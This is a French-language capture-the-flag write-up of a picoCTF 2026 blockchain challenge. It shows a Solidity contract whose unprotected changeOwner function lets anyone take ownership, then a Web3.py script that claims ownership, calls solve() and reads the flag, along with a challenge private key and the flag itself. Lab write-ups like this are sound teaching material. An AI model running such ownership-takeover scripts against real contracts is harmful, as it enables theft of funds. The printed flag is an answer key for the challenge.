---
# Imported from Obsidian: CTF/picoCTF/picoCTF_2026/Access_Control.md
title: Access_Control
category: Cryptography
ctf: picoCTF 2026
date: 2026-08-07
summary: Le contrat présentait une faille de type Broken Access Control. La fonction changeOwner était déclarée en public mais ne possédait aucun modificateur de restriction (comme…
tags:
- blockchain
- cryptography
- picoctf-2026
lang: fr
imported: true
---

#### Catégorie : Blockchain 

Source code : 
```
pragma solidity ^0.8.0;

contract AccessControl {
    address public owner;
    string private flag;
    
    bool public revealed;

    event OwnerChanged(address indexed oldOwner, address indexed newOwner);
    event FlagRevealed(string flag);

    constructor(string memory _flag) {
        owner = msg.sender;
        flag = _flag;
        revealed = false;
    }

    function changeOwner(address _newOwner) public {
        address oldOwner = owner;
        owner = _newOwner;
        emit OwnerChanged(oldOwner, _newOwner);
    }

    function solve() public {
        require(msg.sender == owner, "Only the owner can get the flag.");
        
        if (!revealed) {
            revealed = true;
            emit FlagRevealed(flag);
        }
    }

    function getFlag() public view returns (string memory) {
        require(revealed, "Challenge not yet solved!");
        return flag;
    }
}
```

### Analyse de la vulnérabilité  : 

Le contrat présentait une faille de type **Broken Access Control**. La fonction `changeOwner` était déclarée en `public` mais ne possédait aucun modificateur de restriction (comme `onlyOwner`).

Cela permettait à n'importe quel utilisateur externe d'écraser la variable `owner` stockée sur la blockchain par sa propre adresse.

**Étapes de l'exploitation**

1. **Identification du vecteur** : Repérage de la fonction `changeOwner(address _newOwner)` non protégée.
    
2. **Prise de possession** : Envoi d'une transaction vers le contrat appelant `changeOwner` avec notre adresse.
    
3. **Élévation de privilèges** : Appel de la fonction `solve()`. Le `require(msg.sender == owner)` est maintenant validé puisque nous sommes le nouveau propriétaire.
    
4. **Extraction** : Lecture du flag via la fonction `getFlag()`.
    

**Outils utilisés**

- **Python (Web3.py)** : Pour interagir avec le nœud RPC `lonely-island.picoctf.net:63568` et signer les transactions avec la clé privée fournie.

### Code d'automatisation 
Vu que cast ne prend pas en charge nous allons utiliser python avec la blibliotheque web3 

installation 

```
pip install web3 
```

```
from web3 import Web3

# Configuration
RPC_URL = "http://lonely-island.picoctf.net:63568"
CONTRACT_ADDR = "0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9"
PRIVATE_KEY = "0xa51406f46c0fb4ec51aa05b5860a72de23b11ff0ca3b1690fa0a9cf8935c5c58"
MY_ADDR = "0xEc32AAADB598397587e2906C2dC3A7755D9FbF28"

w3 = Web3(Web3.HTTPProvider(RPC_URL))

# ABI minimale pour les fonctions du challenge
abi = [
    {"inputs":[{"name":"_newOwner","type":"address"}],"name":"changeOwner","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[],"name":"solve","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[],"name":"getFlag","outputs":[{"name":"","type":"string"}],"stateMutability":"view","type":"function"}
]

contract = w3.eth.contract(address=CONTRACT_ADDR, abi=abi)

def run_tx(function_name, *args):
    print(f"[*] Exécution de {function_name}...")
    nonce = w3.eth.get_transaction_count(MY_ADDR)
    func = getattr(contract.functions, function_name)(*args)
    
    tx = func.build_transaction({
        'from': MY_ADDR,
        'nonce': nonce,
        'gas': 200000,
        'gasPrice': w3.eth.gas_price
    })
    
    signed_tx = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"[+] Terminé ! (Hash: {tx_hash.hex()})")
    return receipt

# --- LE PLAN D'ATTAQUE ---
try:
    # 1. On devient owner
    run_tx("changeOwner", MY_ADDR)

    # 2. On valide le challenge
    run_tx("solve")

    # 3. On récupère le flag (C'est un 'call' gratuit, pas besoin de transaction)
    flag = contract.functions.getFlag().call()
    print("\n" + "="*30)
    print(f"🚩 FLAG : {flag}")
    print("="*30)

except Exception as e:
    print(f"\n[!] Erreur : {e}")
```

### Flag : 
```
picoCTF{i_c4n_b3_0wn3r_f5061ac6}
```
